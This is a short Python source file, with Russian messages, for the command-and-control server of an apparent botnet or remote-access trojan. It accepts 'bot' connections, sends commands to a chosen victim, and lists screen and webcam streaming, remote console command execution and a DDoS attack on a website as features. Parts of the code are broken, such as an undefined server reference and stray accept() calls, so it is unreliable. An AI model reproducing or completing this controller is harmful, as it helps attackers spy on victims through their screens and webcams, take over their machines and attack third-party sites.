import socket
import threading
import os

host = "0.0.0.0"
port = 12345

clients = {}

def handle_client(client_socket, client_address):
    name_bot = f"{client_address[0]}:{client_address[1]}"
    clients[name_bot] = client_socket
    print(f"{name_bot} подключен.")

    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command:
                pass
        except:
            print(f"{name_bot} отключен.")
            client_socket.close()
            del clients[name_bot]
            broadcast(f"Пользователь {name_bot} вышел.")
            break

def send_message_to_user(target_ip, message):
    if target_ip in clients:
        clients[target_ip].send(message.encode('utf-8'))
    else:
        print(f"Пользователь {target_ip} не найден.")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(100)
    print("Сервер запущен и ожидает подключения...")

    while True:
        client_socket, client_address = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()

def broadcast(message):
    for ip_address, client_socket in clients.items():
        try:
            client_socket.send(message.encode('utf-8'))
        except:
            client_socket.close()
            del clients[ip_address]

def admin_commands():
    while True:
        command = input("--> ")
        client_socket, client_address = server.accept()
        if command.startswith('@'):
            try:
                target_ip, message = command[1:].split(' ', 1)
                send_message_to_user(target_ip, message)
                if message == "ddos":
                    ddos = input("DDoS --> ")
                    client_socket.send(ddos.encode())
                    result_output = client_socket.recv(1024).decode()
                    print(result_output)
            except ValueError:
                pass

        if command == "help":

            print('''
+-----------------| Commands |-----------------+
| screen                  Стрим рабочего стола |
| webcam                       Стрим вебкамеры |
| browser                      Открытие ссылок |
| stop screen/webcam           Закрытие стрима |
| cmd              Выполнение команд в консоли |
| ddos                      DDoS атака на сайт |
| fun                                   Весело |
+----------------------------------------------+
''')

if __name__ == "__main__":
    threading.Thread(target=admin_commands).start()
    start_server()